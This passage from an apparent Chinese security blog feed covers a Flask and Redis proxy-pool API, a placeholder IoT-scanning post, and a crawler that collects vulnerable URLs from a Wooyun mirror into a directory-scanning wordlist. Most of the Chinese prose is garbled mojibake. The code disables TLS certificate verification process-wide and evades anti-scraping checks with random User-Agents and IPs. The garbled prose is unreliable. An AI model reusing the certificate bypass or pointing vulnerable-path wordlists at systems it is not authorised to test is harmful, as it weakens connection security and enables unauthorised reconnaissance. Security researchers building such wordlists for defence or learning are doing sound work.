Flask(__name__)</div><div class="line"></div><div class="line">def get_conn():</div><div class="line">    if not hasattr(g, &apos;redis&apos;):</div><div class="line">        g.redis = RedisClient()</div><div class="line">    return g.redis</div><div class="line"></div><div class="line">@app.route(&apos;/&apos;)</div><div class="line">def index():</div><div class="line">    render = render_template(&apos;index.html&apos;)</div><div class="line">    return make_response(render)</div><div class="line"></div><div class="line">@app.route(&apos;/random&apos;)</div><div class="line">def get_proxy():</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    è·å–proxyAPI</div><div class="line">    :return: éšæœºä»£ç†</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    conn = get_conn()</div><div class="line">    return conn.random()</div><div class="line"></div><div class="line"></div><div class="line">@app.route(&apos;/count&apos;)</div><div class="line">def get_counts():</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    Get the count of proxies</div><div class="line">    :return: ä»£ç†æ± æ€»é‡</div><div class="line">    &quot;&quot;&quot;</div><div class="line">    conn = get_conn()</div><div class="line">    return str(conn.count())</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>å‰ç«¯æ¨¡ç‰ˆ<code>index.html</code></p>
<p>é¡¹ç›®åœ°å€ï¼š<a href="http://proxy.w2n1ck.com:9090" target="_blank" rel="external">http://proxy.w2n1ck.com:9090</a>/</p>
<p>APIæ¥å£ï¼š<a href="http://proxy.w2n1ck.com:9090/random" target="_blank" rel="external">http://proxy.w2n1ck.com:9090/random</a></p>
<h3 id="0x05-ä½¿ç”¨"><a href="#0x05-ä½¿ç”¨" class="headerlink" title="0x05 ä½¿ç”¨"></a>0x05 ä½¿ç”¨</h3><p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/11111.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/22222.png" alt=""></p>
<p>è·å–ä»£ç†IPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">PROXY_POOL_URL = &apos;http://proxy.w2n1ck.com:9090/random&apos;</div><div class="line">def get_proxy():</div><div class="line">    try:</div><div class="line">        response = requests.get(PROXY_POOL_URL)</div><div class="line">        if response.status_code == 200:</div><div class="line">            return response.text</div><div class="line">    except ConnectionError:</div><div class="line">        return None</div></pre></td></tr></table></figure>
<p>ä½¿ç”¨ä»£ç†IPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">proxy = get_proxy()</div><div class="line">proxies = &#123;</div><div class="line">    &apos;http&apos;: &apos;http://&apos; + proxy,</div><div class="line">    &apos;https&apos;: &apos;https://&apos; + proxy,</div><div class="line">&#125;</div><div class="line">try:</div><div class="line">    response = requests.get(&apos;http://ip.cn/&apos;, proxies=proxies)</div><div class="line">    print(response.text)</div><div class="line">except:</div><div class="line">    pass</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> Redis </tag>
            
            <tag> ä»£ç† </tag>
            
            <tag> Flask </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä¼ç‰¹æ¼æ´æ‰«æ-IoTè®¾å¤‡å®‰å…¨è§£å†³æ–¹æ¡ˆ]]></title>
      <url>/2018/04/23/%E4%BC%8F%E7%89%B9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-IoT%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="# å‰è¨€"></a># å‰è¨€</h3><p>éšç€æ™ºèƒ½ç¡¬ä»¶çš„å…´èµ·ï¼Œå¤§é‡æ™ºèƒ½å®¶å±…å’Œå¯ç©¿æˆ´è®¾å¤‡è¿›å…¥äº†äººä»¬çš„ç”Ÿæ´»ï¼Œæ ¹æ®Gartner æŠ¥å‘Šé¢„æµ‹ï¼Œ2020å¹´å…¨çƒIOTç‰©è”ç½‘è®¾å¤‡æ•°é‡å°†é«˜è¾¾260äº¿ä¸ªã€‚ä½†æ˜¯ç”±äºå®‰å…¨æ ‡å‡†æ»åï¼Œä»¥åŠæ™ºèƒ½è®¾å¤‡åˆ¶é€ å•†ç¼ºä¹å®‰å…¨æ„è¯†å’ŒæŠ•å…¥ï¼Œç‰©è”ç½‘å·²ç»åŸ‹ä¸‹æå¤§éšæ‚£ï¼Œæ˜¯ä¸ªäººéšç§ã€ä¼ä¸šä¿¡æ¯å®‰å…¨ç”šè‡³å›½å®¶å…³é”®åŸºç¡€è®¾æ–½çš„å¤´å·å®‰å…¨å¨èƒã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œæ— è®ºå®¶ç”¨æˆ–ä¼ä¸šçº§çš„äº’è¿è®¾å¤‡ï¼Œå¦‚æ¥å…¥äº’è”ç½‘çš„äº¤é€šæŒ‡ç¤ºç¯ï¼Œæ’æ¸©å™¨ï¼Œæˆ–åŒ»ç”¨ç›‘æ§è®¾å¤‡é­åˆ°æ”»å‡»ï¼Œåæœéƒ½å°†éå¸¸å¯æ€•ã€‚</p>
<p>ç”±äºç‰¹æ®ŠåŸå› ï¼Œæš‚æ—¶æ— æ³•æŸ¥çœ‹ã€‚ã€‚ã€‚</p>
<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1532082587296&amp;di=3f047ed6df763f4508c85a830fa2e308&amp;imgtype=0&amp;src=http%3A%2F%2Fwx1.sinaimg.cn%2Fthumb150%2Fa7a9fff4ly1fifwd8u8bmg205k05kwh5.gif" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> Redis </tag>
            
            <tag> æ‰«æå™¨ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wooyunæ¼æ´åœ°å€urlçˆ¬è™«åŠæ•°æ®å¤„ç†]]></title>
      <url>/2018/03/28/Wooyun%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80url%E7%88%AC%E8%99%AB%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<p>ä¹‹å‰åšæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°@å››çˆ·å‘ç°ä¸ªæ¼æ´ï¼Œä¸€ä¸ªéå¸¸å¤æ€ªçš„åœ°å€ï¼Œæˆ‘é—®å››çˆ·ï¼šâ€œä½ å’‹çŸ¥é“è¿™ä¸ªçš„ï¼Ÿâ€ï¼Œå››çˆ·è¯´ï¼šâ€œæ‰«çš„å•Šï¼â€ï¼Œæˆ‘ï¼šâ€œã€‚ã€‚ã€‚â€ï¼Œæ‰€ä»¥æ‰æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚<br><a id="more"></a></p>
<p>PSï¼šä»¥ä¸Šæ•…äº‹çº¯å±æ‰¯æ·¡ !  0.0</p>
<p>å…¶å®æ˜¯ä»Šå¹´ç»™è‡ªå·±å®šäº†ä¸ªç›®æ ‡ï¼Œå°±æ˜¯å¥½å¥½æŠŠç¼–ç¨‹ç»™å­¦å¥½ï¼Œæ¯•ç«Ÿè‡ªå·±å®‰å…¨é‚£ä¹ˆèœï¼Œè¯´ä¸å®šå°±å¤±ä¸šäº†ã€‚ã€‚ã€‚</p>
<h1 id="0x00-è·å–Wooyunæ¼æ´åœ°å€"><a href="#0x00-è·å–Wooyunæ¼æ´åœ°å€" class="headerlink" title="0x00 è·å–Wooyunæ¼æ´åœ°å€"></a>0x00 è·å–Wooyunæ¼æ´åœ°å€</h1><p>è¿™é‡Œé€‰æ‹©çˆ¬å–çš„ç›®æ ‡æ˜¯<a href="https://wooyun.shuimugan.com/" target="_blank" rel="external">https://wooyun.shuimugan.com</a>ï¼Œè¿™ä¸ªé•œåƒç«™æœ‰ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å®ƒçš„wooyunæ¼æ´åœ°å€å­˜å…¥æ•°æ®åº“çš„æ—¶å€™ä½¿ç”¨äº†idï¼Œå³<code>https://wooyun.shuimugan.com/bug/view?bug_no=1</code>è¿™ç§å½¢å¼ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦éå†<code>bug_no</code>å³å¯è·å–æ‰€æœ‰çš„æ¼æ´åœ°å€ï¼ˆè¿™é‡Œè€ƒè™‘åˆ°æ•°æ®ä¸‹è½½ã€å¤„ç†ã€æ–‡ä»¶ioç­‰å› ç´ ï¼Œé€‰æ‹©äº†å…ˆæŠŠå­˜åœ¨æ¼æ´çš„urlå…ˆå­˜èµ·æ¥ï¼‰ã€‚</p>
<p>æ„Ÿè°¢ç½‘ç«™çš„ç«™é•¿çš„ä¸æ€ä¹‹æ©ï¼å› ä¸ºï¼Œåœ¨è¿›è¡Œè·å–åœ°å€çš„æ—¶å€™ç”±äºä¸€ç›´å†è°ƒè¯•å¹¶å‘å¼•æ“ï¼Œæ‰€ä»¥çˆ¬äº†å¥½å¤šéã€‚ã€‚ã€‚</p>
<p>åœ¨è·å–å­˜åœ¨æ¼æ´URLçš„æ—¶å€™åªä½¿ç”¨äº†åç¨‹ï¼Œç„¶åä¸»ç¨‹åºä½¿ç”¨çš„è¿›ç¨‹ï¼Œæ•°æ®ä¸‹è½½éƒ¨åˆ†ä½¿ç”¨çš„è¿›ç¨‹+åç¨‹ã€‚</p>
<p>åœ¨ä½¿ç”¨requestsè¯·æ±‚çš„æ—¶å€™è™½ç„¶ä¸€ç›´ç”¨<code>verif=False</code>æ¥å¿½ç•¥sslï¼Œä½†æ˜¯ä¼šä¸€ç›´æ‰“å°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/Library/Python/2.7/site-packages/requests/packages/urllib3/connectionpool.py:768: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.html</div><div class="line">InsecureRequestWarning)</div></pre></td></tr></table></figure>
<p>æçš„å¾ˆä¸çˆ½ï¼Œç™¾åº¦äº†ä¸‹ä½¿ç”¨äº†ä¸‹é¢ä»£ç è§£å†³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import ssl</div><div class="line">try:</div><div class="line">    _create_unverified_https_context = ssl._create_unverified_context  # å¿½ç•¥è¯ä¹¦é”™è¯¯</div><div class="line">except AttributeError:</div><div class="line">    pass</div><div class="line">else:</div><div class="line">    ssl._create_default_https_context = _create_unverified_https_context</div></pre></td></tr></table></figure>
<p>è¯·æ±‚çš„æ—¶å€™ä½¿ç”¨äº†é€šç”¨çš„åçˆ¬è™«ç­–ç•¥ï¼š</p>
<ul>
<li>ä¼ªè£…headerå¤´</li>
<li>éšæœºUser-Aagent</li>
<li>éšæœºIP</li>
</ul>
<p>è¿™é‡Œæœ¬æ¥æ˜¯æ‰“ç®—ä½¿ç”¨è‡ªå·±çš„ä»£ç†æ± çš„ï¼Œæ— å¥ˆå…è´¹çš„ä»£ç†å®åœ¨æ˜¯æ…¢ï¼Œæµªè´¹æ—¶é—´ï¼ŒåŒæ—¶å¯èƒ½å¯¼è‡´æ•°æ®ä¸å‡†ç¡®ã€‚æ‰€ä»¥å°±æ²¡æœ‰ä½¿ç”¨ä»£ç†IPäº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">headers = &#123;</div><div class="line">&quot;User-Agent&quot;: random.choice(User-Agent),</div><div class="line">&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</div><div class="line">&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,</div><div class="line">&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</div><div class="line">&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>åç¨‹éƒ¨åˆ†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">from gevent import monkey, pool</div><div class="line">monkey.patch_all()</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf8&apos;)</div><div class="line"></div><div class="line">p = pool.Pool(150)</div><div class="line">for i in range(NUM):</div><div class="line">    _url = url + str(i)</div><div class="line">    jobs.append(p.spawn(getURL, _url))</div><div class="line">gevent.joinall(jobs)</div></pre></td></tr></table></figure>
<p>ç½‘ç«™<code>bug_no</code>æ€»å…±æœ‰230305ä¸ªï¼Œè·å–åˆ°äº†8ä¸‡å¤šä¸ªå­˜åœ¨æ¼æ´çš„åœ°å€ã€‚<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-url.png" alt=""></p>
<h1 id="0x01-ä¸‹è½½æ•°æ®"><a href="#0x01-ä¸‹è½½æ•°æ®" class="headerlink" title="0x01 ä¸‹è½½æ•°æ®"></a>0x01 ä¸‹è½½æ•°æ®</h1><p>ä¸‹è½½æ•°æ®æ˜¯çˆ¬è™«çš„é‡ç‚¹ï¼Œæœ¬ç€<code>åªå¤šä¸å°‘</code>çš„åŸåˆ™ï¼Œæœ¬æ¥è€ƒè™‘åˆ°å¤§çš„æ•°æ®é‡ï¼Œæ•ˆç‡é—®é¢˜ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å‘ç°è·å–çš„è„æ•°æ®å¤ªå¤šï¼Œå¯¹åé¢çš„æ•°æ®å¤„ç†é€ æˆäº†å¾ˆå¤šæ— æ³•é¢„çŸ¥çš„éº»çƒ¦ï¼Œæ‰€ä»¥æœ€ç»ˆé€‰æ‹©çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨<code>xpath+re</code>æ¥è¿›è¡Œæ•°æ®å¤„ç†ã€‚</p>
<p>é¦–å…ˆï¼Œä½¿ç”¨xpathè·å–æ¼æ´ç»†èŠ‚éƒ¨åˆ†ï¼ˆæœ‰äº›urlåœ¨pocå­—æ®µï¼Œä½†æ˜¯è€ƒè™‘åˆ°å¤§éƒ¨åˆ†ï¼Œæ‰€ä»¥åªé€‰æ‹©äº†æ¼æ´ç»†èŠ‚å­—æ®µï¼Œæ‰€ä»¥çˆ¬å–çš„ç»“æœä¸æ˜¯å¾ˆå‡†ç¡®ã€‚ï¼‰<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-xpath.png" alt=""></p>
<p>xpathï¼š<code>//*[@id=&quot;w0&quot;]/tbody/tr[21]/td/text()</code></p>
<p>è¿™é‡Œé‡åˆ°ä¸ªé—®é¢˜å°±æ˜¯æ— è®ºæ€ä¹ˆå¤åˆ¶ï¼Œéƒ½æ— æ³•è·å–åˆ°æ¼æ´ç»†èŠ‚é‡Œé¢çš„å†…å®¹ï¼Œä½¿ç”¨chromeçš„xpath helperä¹Ÿçš„ç¡®æ˜¯èƒ½åŒ¹é…åˆ°å†…å®¹ï¼Œå®åœ¨æ˜¯éƒé—·ï¼æœ€ç»ˆåœ¨æˆ‘@åŠ è²çŒ«å’Œ@nearg1eæ–Œå“¥å“¥çš„å¸®åŠ©ä¸‹æ‰¾åˆ°äº†åŸå› ã€‚</p>
<p>åŸå› åœ¨äºï¼šchromeæµè§ˆå™¨åœ¨è¿›è¡Œé¡µé¢æ¸²æŸ“æ—¶ä½¿ç”¨äº†htmlparseè¿›è¡Œäº†å¤„ç†ï¼Œæ‰€ä»¥è¯¸å¦‚tbodyç­‰ä¸€äº›æ ‡ç­¾æ˜¯chromeè‡ªåŠ¨åŠ è½½çš„ã€‚</p>
<p>æœ€ç»ˆçš„xpathï¼š<code>//*[@id=&quot;w0&quot;]/tr[21]/td//text()</code></p>
<p>ä¸‹é¢å°±æ˜¯ä»æ¼æ´ç»†èŠ‚ä¸­è·å–æ‰€æœ‰çš„URLäº†ï¼Œè¿™é‡Œè¿˜æ˜¯ä¸ºäº†æ›´å¤šçš„è·å–URLï¼Œæ‰¾äº†ä¸ªéå¸¸å…¨é¢çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">r = re.compile(r&apos;(?i)\b((?:[a-z][\w-]+:(?:/&#123;1,3&#125;|[a-z0-9%])|www\d&#123;0,3&#125;[.]|[a-z0-9.\-]+[.][a-z]&#123;2,4&#125;/)(?:[^\s()&lt;&gt;]+|\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\))+(?:\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\)|[^\s\`!()\[\]&#123;&#125;;:\&apos;&quot;.,&lt;&gt;?Â«Â»â€œâ€â€˜â€™]))&apos;)</div></pre></td></tr></table></figure>
<p>å¯¼è‡´åŒ¹é…çš„URLä»€ä¹ˆå¥‡è‘©éƒ½æœ‰ï¼Œå…·ä½“å¯çœ‹ï¼š<a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc.txt" target="_blank" rel="external">dicc.txt</a>çš„å†…å®¹</p>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªreçš„æ—¶å€™åˆé‡åˆ°ä¸ªé—®é¢˜ï¼Œç¨‹åºè·‘ç€è·‘ç€åœäº†ï¼Œå¾ˆæ˜¯æ— è¯­ï¼Œåæ¥ç»å¸®åŠ©è°ƒè¯•å‘ç°æ˜¯æœ‰äº›sqlæ³¨å…¥çš„URLä¸­å­˜åœ¨<code>(,)</code>è¿™ä¸¤ä¸ªå­—ç¬¦ï¼Œå¯¼è‡´æ­£åˆ™æ­»æ‰ï¼Œä¸ºäº†å›¾æ–¹ä¾¿ï¼Œç›´æ¥åšäº†ä¸ªåˆ¤æ–­ç»™å‰”é™¤äº† -ã€‚-</p>
<p>å¹¶å‘éƒ¨åˆ†å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">def create_process(level, jobqueue, plugins, debug, headers):</div><div class="line">    for _ in range(level):</div><div class="line">        process = multiprocessing.Process(target=worker, args=(jobqueue, plugins, debug, headers))</div><div class="line">        process.daemon = True</div><div class="line">        process.start()</div><div class="line"></div><div class="line">def worker(jobqueue, plugins, debug, headers):</div><div class="line">    while True:</div><div class="line">        try:</div><div class="line">            target = jobqueue.get()</div><div class="line">                gevent_scan_task(target, plugins, debug, headers)</div><div class="line">        except Exception, e:</div><div class="line">            print traceback.format_exc()</div><div class="line">        finally:</div><div class="line">            jobqueue.task_done()</div><div class="line"></div><div class="line">def gevent_scan_task(target, plugins, debug, headers):</div><div class="line">    evt = Event()</div><div class="line">    pool = []</div><div class="line">    scanmodle = ScanModle(target, plugins, debug, headers)</div><div class="line">    pool.append(gevent.spawn(scanmodle.scan_port(evt)))</div><div class="line">    pool.append(gevent.spawn(scanmodle.scan_plugins(evt)))</div><div class="line">    for port in scanmodle.get_ports():</div><div class="line">        pool.append(gevent.spawn(scanmodle.scan_plugins(evt, port)))</div><div class="line">    gevent.joinall(pool)</div><div class="line">    save_cache(scanmodle)</div></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆè·å–åˆ°äº†153217ä¸ªåœ°å€<br><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-1.png" alt=""></p>
<h1 id="0x02-æ•°æ®å¤„ç†"><a href="#0x02-æ•°æ®å¤„ç†" class="headerlink" title="0x02 æ•°æ®å¤„ç†"></a>0x02 æ•°æ®å¤„ç†</h1><p>è¿™éƒ¨åˆ†è¯´éš¾ä¹Ÿéš¾è¯´ä¸éš¾ä¹Ÿä¸éš¾ï¼Œæˆ‘æ˜¯ä¸å¤ªåœ¨è¡Œã€æ‚è„¸ã€‘ï¼Œç›®å‰æˆ‘å¤„ç†çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>å»é™¤æ‰€æœ‰ä¸­æ–‡éƒ¨åˆ†ï¼ˆè¿™é‡Œç”±äºæœ‰äº›urlä¸­çš„ç¡®æ˜¯å¸¦ä¸­æ–‡ï¼Œæ‰€æœ‰ä½¿ç”¨æ¢è¡Œæ›¿æ¢ï¼‰</li>
<li>å»é™¤æ‰€æœ‰åªæœ‰<code>/</code>ï¼Œ<code>.</code>åŠ<code>len(strip(link) == 0</code>çš„éƒ¨åˆ†</li>
<li>è·å–æ‰€æœ‰URLä¸­çš„ç›®å½•éƒ¨åˆ†(ä½¿ç”¨urlparse)</li>
<li>å»é™¤ä¸€äº›å…¶ä»–æ¯”å¦‚<code>wooyun/bugs</code>ï¼Œ<code>jdbc</code>ï¼Œ<code>**</code>ï¼Œ<code>xmlns</code>ï¼Œ<code>t.cn</code>ï¼Œ<code>ldap</code>ï¼Œ<code>ssh</code>ç­‰éé¢„æœŸå­—ç¬¦åŠé•¿åº¦å°äºç­‰äº4çš„éƒ¨åˆ†</li>
<li>ä½¿ç”¨urlparseè·å–<code>p.path</code>, <code>p.query</code>,<code>p.fragment</code>,å¹¶ä½¿ç”¨<code>isinstance</code>æ¥åˆ¤æ–­ä¸¤ä¸ªURLæ˜¯å¦ç›¸åŒæ¥å»é‡</li>
</ol>
<p><strong>è¯´æ˜ï¼š</strong></p>
<p>1ã€ç¬¬ä¸‰æ­¥æ²¡æœ‰ä½¿ç”¨è¿­ä»£ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">/wooyun/bugs/?id=1</div><div class="line">æ²¡æœ‰è·å–ï¼š</div><div class="line">?id=1</div><div class="line">/wooyun</div><div class="line">/wooyun/bugs/</div><div class="line">åªæ˜¯è·å–åˆ°ï¼š</div><div class="line">/wooyun/bugs/?id=1</div><div class="line">æœ‰å…´è¶£å¯å‚è€ƒï¼šhttps://github.com/Xyntax/POC-T/blob/2.0/plugin/urlparser.py</div></pre></td></tr></table></figure>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import urlparse</div><div class="line">import sys</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</div><div class="line"></div><div class="line">def iterate_path(ori_str):</div><div class="line"># parser = urlparse.urlparse(ori_str)</div><div class="line"># _path_list = parser.path.replace(&apos;//&apos;, &apos;/&apos;).strip(&apos;/&apos;).split(&apos;/&apos;)</div><div class="line"># print _path_list</div><div class="line">    _ans_list = set()</div><div class="line">    _ans_list.add(ori_str)</div><div class="line">    _ans_list = list(_ans_list)</div><div class="line">    for i in range(len(_ans_list)):</div><div class="line">        p = urlparse.urlparse(_ans_list[i])</div><div class="line">        return urlparse.urlunsplit([&apos;&apos;, &apos;&apos;, p.path, p.query, p.fragment])</div></pre></td></tr></table></figure>
<p>2ã€ç¬¬äº”æ­¥æ˜¯ç®€å•å»é™¤å¦‚ä¸‹ç±»å‹çš„URLï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">/wooyun/?id=1&amp;url=123</div><div class="line">/wooyun/?id=2&amp;url=233</div><div class="line">/wooyun/?id=3&amp;url=666</div><div class="line">å’Œ</div><div class="line">/wooyun/1.html</div><div class="line">/wooyun/233.html</div><div class="line">/wooyun/6666.html</div></pre></td></tr></table></figure>
<h1 id="0x03-åç»­"><a href="#0x03-åç»­" class="headerlink" title="0x03 åç»­"></a>0x03 åç»­</h1><p>å…¶å®æˆ‘ä¸»è¦æ˜¯æƒ³è·å–ä¸ªæ‰«æç›®å½•çš„å­—å…¸ï¼Œä½†æ˜¯å¦‚æœå‘æ•£ä¸‹å‘¢ï¼Ÿè¿™äº›URLæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p>
<p>æˆ‘æ€è€ƒçš„å¦‚ä¸‹ï¼š</p>
<p>1ã€åœ¨æˆ‘åˆšç®—å…¥é—¨å®‰å…¨çš„æ—¶å€™wooyunå½å½äº†ï¼Œæ‰€ä»¥æœ‰äº›æ¼æ´è‡ªå·±åŸºæœ¬ä¸Šæ²¡è§è¿‡ï¼Œè¦æ˜¯åœ¨ä¸€ä¸ªä¸€ä¸ªå»çœ‹æ–‡ç« ï¼Œé‚£ä»£ä»·å¤ªå¤§äº†ä¹Ÿæ²¡æœ‰æ—¶é—´ã€‚ä½¿ç”¨è¿™ä¸ªåšç›®å½•æ‰«æçš„æ—¶å€™ï¼Œå¦‚æœå‘ç°å­˜åœ¨æ­¤URLï¼Œé‚£ä¹ˆè¯´æ˜åœ¨wooyunä¸Šæ˜¯å­˜åœ¨è¿™ä¸ªæ¼æ´çš„ï¼Œå¦‚æœè‡ªå·±ä¸çŸ¥é“å°±å¯ä»¥æœä¸€æ³¢ï¼Œå­¦ä¹ ä¸‹äº†ï¼Œå¿«æ·ã€é«˜æ•ˆã€‚</p>
<p>2ã€åšagentã€å…¥ä¾µé˜²å¾¡ã€æ€åŠ¿æ„ŸçŸ¥çš„è¯ï¼Œå¯æŠŠè¿™äº›åšæˆæ¼æ´åº“ï¼Œé‡åˆ°è®¿é—®è¿™äº›åœ°å€å°±å¯ä»¥æ¥ä¸ªå‘Šè­¦ï¼Œä¹Ÿå¯ä»¥å½“ä¸ªå¨èƒæƒ…æŠ¥ææã€‚</p>
<p>3ã€åšä¸ªæ¼æ´åˆ†æï¼Œçœ‹çœ‹å¤§ä½¬ä»¬éƒ½å–œæ¬¢æäº¤å•¥æ¼æ´ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ æ’åœ¨ç¬¬ä¸€äºŒçš„æ˜¯svnå’Œgitï¼‰</p>
<p>è·å–çš„æ•°æ®ï¼Œå¤„ç†å’Œæ²¡å¤„ç†çš„éƒ½å¯ä»¥åœ¨ä¸‹é¢åœ°å€ä¸‹è½½ï¼ˆPSï¼šå¤„ç†çœŸçš„åªæ˜¯ç®€å•å¤„ç†ï¼Œæ¯”å¦‚å¤§ä½¬ä»¬ä¸Šä¼ çš„webshellã€ä¸€äº›åªé’ˆå¯¹æŸä¸ªç½‘ç«™çš„URLç­›é€‰ç­‰éƒ½å¾—åšï¼Œï¼Œï¼Œæ…ç”¨ï¼åç»­è¿˜å¾—ä¼˜åŒ–ï¼Œå¤§ä½¬ä»¬æœ‰å…´è¶£çš„è¯å¸¦å¸¦æˆ‘ã€‚ 0.0ï¼‰</p>
<p><strong>æœªå¤„ç†ï¼š</strong><a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc.txt" target="_blank" rel="external">dicc.txt</a></p>
<p><strong>å·²å¤„ç†ï¼š</strong><a href="https://github.com/w2n1ck/wooyunDic/blob/master/dicc8.txt" target="_blank" rel="external">dicc8.txt</a></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/wooyun-wooyun.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
            <tag> Wooyun </tag>
            
            <tag> å­—å…¸ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSI-æœåŠ¡å™¨ç«¯åŒ…å«æ³¨å…¥]]></title>
